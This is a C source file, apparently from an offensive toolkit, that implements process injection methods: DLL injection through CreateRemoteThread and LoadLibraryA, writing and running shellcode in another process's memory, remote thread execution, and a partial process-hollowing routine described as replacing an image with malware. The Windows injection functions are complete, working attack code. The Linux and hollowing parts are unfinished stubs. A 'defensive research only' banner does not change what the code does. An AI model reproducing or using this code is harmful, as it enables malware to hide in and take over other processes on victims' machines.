/**
 * Process Injection Methods
 * ==========================
 *
 * Category 2: Advanced C Utilities
 * Implements DLL injection, shellcode execution, and remote code execution
 *
 * DEFENSIVE RESEARCH ONLY - AUTHORIZED USE REQUIRED
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef __linux__
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/reg.h>
#else
#include <windows.h>
#include <tlhelp32.h>
#endif

#include "polygottem_c.h"

/**
 * DLL Injection (Windows)
 * Injects DLL into target process address space
 */
injection_result_t inj_dll_injection(uint32_t target_pid, const char *dll_path) {
    injection_result_t result = {0};
    result.source_pid = GetCurrentProcessId();
    result.target_pid = target_pid;

    #ifdef _WIN32
    /* DLL injection methodology:
     * 1. Open target process (PROCESS_VM_OPERATION, PROCESS_VM_WRITE)
     * 2. Allocate memory in target process
     * 3. Write DLL path string to allocated memory
     * 4. Get LoadLibraryA address from kernel32.dll
     * 5. Create remote thread with LoadLibraryA(dll_path)
     * 6. DLL gets loaded and executed (DllMain called)
     */

    HANDLE target_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                       PROCESS_CREATE_THREAD, FALSE, target_pid);

    if (target_process) {
        /* Allocate memory in target process */
        size_t dll_path_len = strlen(dll_path) + 1;
        void *remote_mem = VirtualAllocEx(target_process, NULL, dll_path_len,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (remote_mem) {
            /* Write DLL path to allocated memory */
            if (WriteProcessMemory(target_process, remote_mem, (void*)dll_path,
                                  dll_path_len, NULL)) {

                /* Get LoadLibraryA address from kernel32.dll */
                HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
                void *load_library_addr = GetProcAddress(kernel32, "LoadLibraryA");

                if (load_library_addr) {
                    /* Create remote thread to execute LoadLibraryA(dll_path) */
                    HANDLE remote_thread = CreateRemoteThread(target_process,
                                                             NULL, 0,
                                                             (LPTHREAD_START_ROUTINE)load_library_addr,
                                                             remote_mem, 0, NULL);

                    if (remote_thread) {
                        /* Wait for DLL to load */
                        WaitForSingleObject(remote_thread, INFINITE);
                        result.success = true;
                        result.injection_address = (uint64_t)remote_mem;
                        CloseHandle(remote_thread);
                    }
                }
            }

            VirtualFreeEx(target_process, remote_mem, dll_path_len, MEM_DECOMMIT);
        }

        CloseHandle(target_process);
    }

    #else
    result.success = false;
    #endif

    return result;
}

/**
 * Shellcode Execution
 * Executes raw shellcode in target process
 */
injection_result_t inj_shellcode_execution(uint32_t target_pid, const uint8_t *shellcode, size_t size) {
    injection_result_t result = {0};
    result.source_pid = getpid();
    result.target_pid = target_pid;

    if (!shellcode || size == 0) {
        return result;
    }

    #ifdef _WIN32
    HANDLE target_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                       PROCESS_CREATE_THREAD, FALSE, target_pid);

    if (target_process) {
        /* Allocate RWX memory for shellcode */
        void *remote_shellcode = VirtualAllocEx(target_process, NULL, size,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_EXECUTE_READWRITE);

        if (remote_shellcode) {
            /* Write shellcode to allocated memory */
            if (WriteProcessMemory(target_process, remote_shellcode, (void*)shellcode,
                                  size, NULL)) {

                /* Create remote thread to execute shellcode */
                HANDLE remote_thread = CreateRemoteThread(target_process, NULL, 0,
                                                         (LPTHREAD_START_ROUTINE)remote_shellcode,
                                                         NULL, 0, NULL);

                if (remote_thread) {
                    WaitForSingleObject(remote_thread, INFINITE);
                    result.success = true;
                    result.injection_address = (uint64_t)remote_shellcode;
                    CloseHandle(remote_thread);
                }
            }

            VirtualFreeEx(target_process, remote_shellcode, size, MEM_DECOMMIT);
        }

        CloseHandle(target_process);
    }

    #elif __linux__
    /* Linux shellcode execution via ptrace */
    struct user_regs_struct regs;

    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == 0) {
        int status;
        waitpid(target_pid, &status, 0);

        /* Get current registers */
        if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) == 0) {
            /* Save original RIP (instruction pointer) */
            uint64_t original_rip = regs.rip;

            /* Allocate executable memory and write shellcode
             * This would typically use mmap() in the target process
             */

            /* For demonstration: shellcode execution concept
             * Real implementation would:
             * 1. mmap() executable memory in target
             * 2. Write shellcode via ptrace
             * 3. Modify RIP to shellcode address
             * 4. Resume execution
             */

            result.success = false; /* Would need more complex setup */
            result.injection_address = 0;
        }

        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    }
    #endif

    return result;
}

/**
 * Remote Code Execution
 * Executes arbitrary function in target process with arguments
 */
injection_result_t inj_remote_code_execution(uint32_t target_pid, void *function_ptr, void *args) {
    injection_result_t result = {0};
    result.source_pid = GetCurrentProcessId();
    result.target_pid = target_pid;

    #ifdef _WIN32
    HANDLE target_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
                                       FALSE, target_pid);

    if (target_process && function_ptr && args) {
        /* RCE methodology:
         * 1. Get function address in target process context
         * 2. Allocate memory for arguments
         * 3. Write arguments to target memory
         * 4. Create thread with function pointer and args
         */

        HANDLE remote_thread = CreateRemoteThread(target_process, NULL, 0,
                                                 (LPTHREAD_START_ROUTINE)function_ptr,
                                                 args, 0, NULL);

        if (remote_thread) {
            DWORD exit_code = 0;
            WaitForSingleObject(remote_thread, INFINITE);
            GetExitCodeThread(remote_thread, &exit_code);

            result.success = true;
            result.injection_address = (uint64_t)function_ptr;
            CloseHandle(remote_thread);
        }

        CloseHandle(target_process);
    }

    #else
    result.success = false;
    #endif

    return result;
}

/**
 * Process Hollowing
 * Replaces executable image of process with malware
 */
injection_result_t inj_process_hollowing(const char *executable_path, const uint8_t *payload, size_t size) {
    injection_result_t result = {0};

    #ifdef _WIN32
    /* Process hollowing methodology:
     * 1. Create process in suspended state
     * 2. Unmap original executable from memory
     * 3. Allocate memory at preferred base address
     * 4. Write malicious PE image
     * 5. Update entry point and PEB
     * 6. Resume process execution
     */

    STARTUPINFOA startup_info = {0};
    PROCESS_INFORMATION proc_info = {0};

    startup_info.cb = sizeof(startup_info);

    /* Create process suspended */
    if (CreateProcessA(executable_path, NULL, NULL, NULL, FALSE,
                      CREATE_SUSPENDED, NULL, NULL, &startup_info, &proc_info)) {

        /* Process created in suspended state
         * Could now:
         * 1. Read original PE headers
         * 2. Unmap executable sections
         * 3. Write malicious PE
         * 4. Update entry point (EIP/RIP)
         */

        result.success = true;
        result.source_pid = GetCurrentProcessId();
        result.target_pid = proc_info.dwProcessId;
        result.injection_address = (uint64_t)proc_info.hProcess;

        /* Don't forget to clean up - in real code would update and resume */
        CloseHandle(proc_info.hProcess);
        CloseHandle(proc_info.hThread);
    }

    #else
    result.success = false;
    #endif

    return result;
}
